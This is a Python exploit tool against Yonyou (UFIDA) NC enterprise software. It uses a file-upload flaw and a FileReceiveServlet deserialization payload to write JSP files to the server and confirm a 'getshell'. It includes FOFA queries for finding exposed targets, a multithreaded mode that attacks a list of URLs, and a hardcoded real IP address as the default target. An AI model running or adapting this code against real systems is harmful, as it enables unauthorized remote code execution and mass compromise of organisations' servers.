#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import fire
from loguru import logger

import requests
import threadpool

proxies = {"https": "http://127.0.0.1:8083",
           "http": "http://127.0.0.1:8083"
}
proxies = {
    "https": "http://localhost:8080",
    "http": "http://localhost:8080"
}

headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 " \
        "(KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept" : "*/*",
    "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding" : "gzip, deflate",
    "Referer": "https://google.com",
}

class YYNC(object):
    """

    Usage:
        # python3 automanage.py yync yync_upload -u http://127.0.0.1
        python3 yync.py yync_upload --url http://127.0.0.1
        python3 yync.py yync_deserialize_exp --url http://127.0.0.1
        python3 yync.py yync_deserialize_exp_multithreading --func yync_deserialize_exp --file_name url.txt
    """
    def __init__(self):
        pass

    def yync_upload(self, url, file_name = "test.text", file_path = "\\\webapps\\\\nc_web\\\\test1.jsp"):
        """
        通过上传文件漏洞上传 shell 文件 getshell
        fofa: icon_hash="1085941792"
        """
        uri = "/aim/equipmap/accept.jsp"
        file_content = "<% out.println(\"hello\");%>"
        payload = {
            "file": (file_name, file_content),
            "fname": (None, file_path),
        }
        response = requests.post(
            url = url + uri,
            headers = headers,
            files = payload,
            verify = False,
            timeout = 10
        )
        if response.status_code == 200 and "parent.afterUpload(1)" in response.text:
            logger.info("success!!!")
            logger.info(f"shell: {url}/test1.jsp")
        else:
            logger.error("fail")

    def create_thread_pool(self, func, works, pools = 5):
        pool = threadpool.ThreadPool(pools)
        requests = threadpool.makeRequests(func, works)
        [pool.putRequest(req) for req in requests]
        pool.wait()

    def yync_deserialize_exp(self, url, shell_flag = "t0test0ls", shell_name = "t00ls.jsp"):
        """
        用友 NC 6.5 FileReceiveServlet 反序列化RCE漏洞 serialize and deserialize
        通过反序列化漏洞与上传文件漏洞上传 shell 文件 getshell
        fofa: app="用友-UFIDA-NC"
        Reference:
            https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E7%94%A8%E5%8F%8B-NC-FileReceiveServlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E.md
        """
        uri = "/servlet/FileReceiveServlet"
        deserialize_data = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69" \
            "\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00" \
            "\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68" \
            "\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08" \
            "\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d" \
            "\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52" \
            "\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77" \
            "\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"
        '''
        ¬ísrjava.util.HashMapÚÁÃ`ÑF
        loadFactorI     thresholdxp?@
        t     FILE_NAMEt      t00ls.jsptTARGET_FILE_PATHt./webapps/nc_webx
        '''

        deserialize_data += shell_flag
        try:
            response = requests.post(
                url = url + uri,
                headers = headers,
                data = deserialize_data,
                verify = False,
                timeout = 25
            )
            if response.status_code == 200:
                response = requests.get(url + "/" + shell_name, headers = headers, verify = False, timeout = 25)
                if response.text.index(shell_flag) >= 0:
                    print_flag = f"[Getshell] {url}/{shell_name}"
                    logger.info(print_flag)
                    return url + "/" + shell_name
        except Exception as e:
            logger.error(e)

    def yync_deserialize_exp_multithreading(self, func, pools = 5, file_name = "url.txt"):
        works = []
        try:
            with open(file_name, "r") as f:
                for url in f:
                    func_params = [url.rstrip("\n")]
                    works.append((func_params, None))
        except FileNotFoundError:
            logger.error(f"File {file_name} not found")
            return
        self.create_thread_pool(func, works, pools)

    def main(self):
        url = "http://127.0.0.1" # http://36.134.129.73:8091/index.jsp
        url = "http://36.134.129.73:8091"
        self.yync_upload(url)
        self.yync_deserialize_exp(url)
        # self.yync_deserialize_exp_multithreading(url, self.yync_deserialize_exp)

if __name__ == "__main__":
    fire.Fire(YYNC)
    